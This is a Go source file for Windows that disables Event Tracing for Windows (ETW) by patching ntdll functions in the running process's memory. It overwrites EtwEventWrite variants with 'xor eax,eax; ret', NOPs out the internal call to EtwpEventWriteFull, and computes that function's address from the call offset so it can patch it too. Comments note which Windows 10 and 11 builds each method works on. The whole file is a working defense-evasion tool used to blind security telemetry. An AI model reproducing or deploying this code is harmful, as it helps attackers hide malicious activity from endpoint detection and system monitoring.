package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	x64_CALL_INSTRUCTION_OPCODE byte = 0xE8 // 'call'
	x64_RET_INSTRUCTION_OPCODE  byte = 0xC3 // 'ret'
	x64_INT3_INSTRUCTION_OPCODE byte = 0xCC // 'int3'
	NOP_INSTRUCTION_OPCODE      byte = 0x90 // 'nop'

	PATCH_SIZE      uintptr = 0x05
	MAX_SCAN_LENGTH         = 1024
)

// main function for testing
func main() {

	/*if Patch_Selected_Etw_Function_At_Start("EtwEventWrite") {
		fmt.Println("EtwEventWrite patched")
	}

	if Patch_Selected_Etw_Function_At_Start("EtwEventWriteEx") {
		fmt.Println("EtwEventWriteEx patched")
	}

	if Patch_Selected_Etw_Function_At_Start("EtwEventWriteFull") {
		fmt.Println("EtwEventWriteFull patched")
	}*/

	/*if Patch_EtwpEventWriteFull_Call("EtwEventWrite") {
		fmt.Println("EtwpEventWriteFull patched in EtwEventWrite")
	}*/

	/*if Patch_EtwpEventWriteFull_Call("EtwEventWriteEx") {
		fmt.Println("EtwpEventWriteFull patched in EtwEventWriteEx")
	}*/

	/*if Patch_EtwpEventWriteFull_Call("EtwEventWriteFull") {
		fmt.Println("EtwpEventWriteFull patched in EtwEventWriteFull")
	}*/

	//Patch_EtwpEventWriteFull_Start("EtwEventWriteFull")
	Patch_EtwpEventWriteFull_Start("EtwEventWriteEx")
}

// this function works in windows 10 and windows 11, because it patches only the beginning of the function instructions
// windows 10 and windows 11 work with: EtwEventWriteFull, EtwEventWrite and EtwEventWriteEx
func Patch_Selected_Etw_Function_At_Start(functionToPatch string) bool {
	var oldProtection uint32
	var pEtwFuncAddress uintptr
	ntdllHandle := new(windows.Handle)

	/*fmt.Println("Press enter to continue, this is for use with debuggers like x64dbg")
	bufio.NewReader(os.Stdin).ReadBytes('\n')*/

	shellcode := []byte{
		0x33, 0xC0, // xor eax, eax
		0xC3, // ret
	}

	ptr, err := syscall.UTF16PtrFromString("ntdll.dll")
	if err != nil {
		return false
	}

	err = windows.GetModuleHandleEx(windows.GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, ptr, ntdllHandle)
	if err != nil {
		return false
	}
	if *ntdllHandle == 0 {
		return false
	}

	pEtwFuncAddress, err = windows.GetProcAddress(*ntdllHandle, functionToPatch)
	if err != nil {
		return false
	}
	if pEtwFuncAddress == 0 {
		return false
	}

	fmt.Printf("\t> Address of \"%s\" : 0x%X \n", functionToPatch, pEtwFuncAddress)
	fmt.Printf("\t> Patching with \"%X\" ... ", shellcode)

	err = windows.VirtualProtect(
		pEtwFuncAddress,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtection,
	)
	if err != nil {
		fmt.Printf("[!] VirtualProtect [1] failed: %v \n", err)
		return false
	}

	/*fmt.Println("Press enter to continue, this is for use with debuggers like x64dbg")
	bufio.NewReader(os.Stdin).ReadBytes('\n')*/

	targetMemory := unsafe.Slice((*byte)(unsafe.Pointer(pEtwFuncAddress)), len(shellcode))
	copiedBytes := copy(targetMemory, shellcode)

	if copiedBytes != len(shellcode) {
		fmt.Printf("[!] Failed to copy shellcode (copied %d of %d bytes)\n", copiedBytes, len(shellcode))
		_ = windows.VirtualProtect(pEtwFuncAddress, uintptr(len(shellcode)), oldProtection, &oldProtection)
		return false
	}

	var dummyOldProtection uint32
	err = windows.VirtualProtect(
		pEtwFuncAddress,
		uintptr(len(shellcode)),
		oldProtection,
		&dummyOldProtection,
	)
	if err != nil {
		fmt.Printf("[!] VirtualProtect [2] failed: %v \n", err)
		return false
	}

	fmt.Println("[+] DONE !")

	/*fmt.Println("Press enter to continue, this is for use with debuggers like x64dbg")
	bufio.NewReader(os.Stdin).ReadBytes('\n')*/

	return true
}

// windows 10 works with: EtwEventWriteFull, EtwEventWrite and EtwEventWriteEx
// windows 11 24h2 and later works with: EtwEventWriteFull and EtwEventWriteEx
func Patch_EtwpEventWriteFull_Call(functionToPatch string) bool {
	var i int = 0
	var dwOldProtection uint32
	var pEtwFuncAddress unsafe.Pointer

	ntdllHandle, err := windows.LoadLibrary("NTDLL.DLL")
	if err != nil {
		fmt.Printf("[!] LoadLibrary(\"NTDLL.DLL\") failed with error: %v\n", err)
		return false
	}

	/*fmt.Println("Press enter to continue, this is for use with debuggers like x64dbg")
	bufio.NewReader(os.Stdin).ReadBytes('\n')*/

	procAddress, err := windows.GetProcAddress(ntdllHandle, functionToPatch)
	if err != nil {
		fmt.Printf("[!] GetProcAddress(\"%s\") failed with error: %v\n", functionToPatch, err)
		return false
	}
	pEtwFuncAddress = unsafe.Pointer(procAddress)

	fmt.Printf("[+] Address Of \"%s\" : 0x%X \n", functionToPatch, procAddress)

	const maxScanBytes = 2048
	foundRetInt3 := false
	for i = 0; i < maxScanBytes-1; i++ {
		byte1 := *(*byte)(unsafe.Pointer(uintptr(pEtwFuncAddress) + uintptr(i)))
		byte2 := *(*byte)(unsafe.Pointer(uintptr(pEtwFuncAddress) + uintptr(i) + 1))

		if byte1 == x64_RET_INSTRUCTION_OPCODE && byte2 == x64_INT3_INSTRUCTION_OPCODE {
			foundRetInt3 = true
			break
		}
	}

	if !foundRetInt3 {
		fmt.Printf("[!] Could not find 'ret; int3' sequence in \"%s\" within %d bytes.\n", functionToPatch, maxScanBytes)
		return false
	}

	foundCall := false
	originalPEtwFuncAddress := pEtwFuncAddress
	for ; i >= 0; i-- {
		currentBytePtr := unsafe.Pointer(uintptr(originalPEtwFuncAddress) + uintptr(i))
		if *(*byte)(currentBytePtr) == x64_CALL_INSTRUCTION_OPCODE {
			pEtwFuncAddress = currentBytePtr
			foundCall = true
			break
		}
	}

	if !foundCall {
		fmt.Printf("[!] Could not find 'call' instruction searching backwards from 'ret; int3' in \"%s\".\n", functionToPatch)
		return false
	}

	if pEtwFuncAddress == nil || *(*byte)(pEtwFuncAddress) != x64_CALL_INSTRUCTION_OPCODE {
		fmt.Printf("[!] The identified instruction at 0x%X is not a 'call' (0x%X).\n", uintptr(pEtwFuncAddress), *(*byte)(pEtwFuncAddress))
		return false
	}

	/*fmt.Println("Press enter to continue, this is for use with debuggers like x64dbg")
	bufio.NewReader(os.Stdin).ReadBytes('\n')*/

	fmt.Printf("\t> Target \"call\" instruction : 0x%X \n", uintptr(pEtwFuncAddress))
	fmt.Print("\t> Patching with NOPs (")
	for range int(PATCH_SIZE) {
		fmt.Printf("%02X ", NOP_INSTRUCTION_OPCODE)
	}
	fmt.Println(")... ")

	err = windows.VirtualProtect(
		uintptr(pEtwFuncAddress),
		PATCH_SIZE,
		windows.PAGE_EXECUTE_READWRITE,
		&dwOldProtection,
	)
	if err != nil {
		fmt.Printf("[!] VirtualProtect [1] (to RWX) failed with error: %v\n", err)
		return false
	}

	for j := uintptr(0); j < PATCH_SIZE; j++ {
		targetByte := (*byte)(unsafe.Pointer(uintptr(pEtwFuncAddress) + j))
		*targetByte = NOP_INSTRUCTION_OPCODE
	}

	var dwDummyProtection uint32
	err = windows.VirtualProtect(
		uintptr(pEtwFuncAddress),
		PATCH_SIZE,
		dwOldProtection,
		&dwDummyProtection,
	)
	if err != nil {
		fmt.Printf("[!] VirtualProtect [2] (restore protection) failed with error: %v\n", err)
		return false
	}

	fmt.Println("[+] DONE !")

	/*fmt.Println("Press enter to continue, this is for use with debuggers like x64dbg")
	bufio.NewReader(os.Stdin).ReadBytes('\n')*/

	return true
}

// windows 10 works with: EtwEventWriteFull, EtwEventWrite and EtwEventWriteEx
// windows 11 24h2 and later works with: EtwEventWriteFull and EtwEventWriteEx
func Get_EtwpEventWriteFull_Address(functionToPatch string) unsafe.Pointer {
	ntdll, err := windows.LoadLibrary("NTDLL.dll")
	if err != nil {
		return nil
	}

	etwEventWriteAddr, err := windows.GetProcAddress(ntdll, functionToPatch)
	if err != nil {
		return nil
	}
	if etwEventWriteAddr == 0 {
		return nil
	}
	fmt.Printf("[+] pEtwEventFunc %s: 0x%X \n", functionToPatch, etwEventWriteAddr)

	pEtwEventFuncBytes := unsafe.Slice((*byte)(unsafe.Pointer(etwEventWriteAddr)), MAX_SCAN_LENGTH)

	var i int
	foundRetInt3 := false

	for i = 0; i < MAX_SCAN_LENGTH-1; i++ {
		if pEtwEventFuncBytes[i] == x64_RET_INSTRUCTION_OPCODE && pEtwEventFuncBytes[i+1] == x64_INT3_INSTRUCTION_OPCODE {
			foundRetInt3 = true
			break
		}
	}

	if !foundRetInt3 {
		return nil
	}

	currentBaseAddr := etwEventWriteAddr
	foundCall := false

	for ; i > 0; i-- {
		if pEtwEventFuncBytes[i] == x64_CALL_INSTRUCTION_OPCODE {
			currentBaseAddr = etwEventWriteAddr + uintptr(i)
			foundCall = true
			break
		}
	}

	if !foundCall {
		return nil
	}

	if *(*byte)(unsafe.Pointer(currentBaseAddr)) != x64_CALL_INSTRUCTION_OPCODE {
		return nil
	}

	fmt.Printf("\t> \"call EtwpEventWriteFull\" (assumed): 0x%X \n", currentBaseAddr)

	offsetAddr := currentBaseAddr + 1

	relativeOffset := *(*int32)(unsafe.Pointer(offsetAddr))
	fmt.Printf("\t> Relative Offset : 0x%0.8X (%d)\n", uint32(relativeOffset), relativeOffset)

	etwpEventWriteFullAddr := currentBaseAddr + 5 + uintptr(relativeOffset)

	return unsafe.Pointer(etwpEventWriteFullAddr)
}

// windows 10 works with: EtwEventWriteFull, EtwEventWrite and EtwEventWriteEx
// windows 11 24h2 and later works with: EtwEventWriteFull and EtwEventWriteEx
func Patch_EtwpEventWriteFull_Start(functionToPatch string) bool {
	shellcode := []byte{
		0x33, 0xC0, // xor eax, eax
		0xC3, // ret
	}

	/*fmt.Println("Press enter to continue, this is for use with debuggers like x64dbg")
	bufio.NewReader(os.Stdin).ReadBytes('\n')*/

	pEtwpEventWriteFull := Get_EtwpEventWriteFull_Address(functionToPatch)

	if pEtwpEventWriteFull == nil {
		return false
	}
	fmt.Printf("[+] pEtwpEventWriteFull: 0x%X \n", uintptr(pEtwpEventWriteFull))

	fmt.Printf("\t> Patching with \"33 C0 C3\" ... ")

	var oldProtection uint32
	sizeToPatch := uintptr(len(shellcode))

	err := windows.VirtualProtect(
		uintptr(pEtwpEventWriteFull),
		sizeToPatch,
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtection,
	)
	if err != nil {
		return false
	}

	targetMemorySlice := unsafe.Slice((*byte)(pEtwpEventWriteFull), len(shellcode))
	copy(targetMemorySlice, shellcode)

	var dummyOldProtection uint32
	err = windows.VirtualProtect(
		uintptr(pEtwpEventWriteFull),
		sizeToPatch,
		oldProtection,
		&dummyOldProtection,
	)
	if err != nil {
		return false
	}

	/*fmt.Println("Press enter to continue, this is for use with debuggers like x64dbg")
	bufio.NewReader(os.Stdin).ReadBytes('\n')*/

	fmt.Printf("[+] DONE !\n\n")
	return true
}
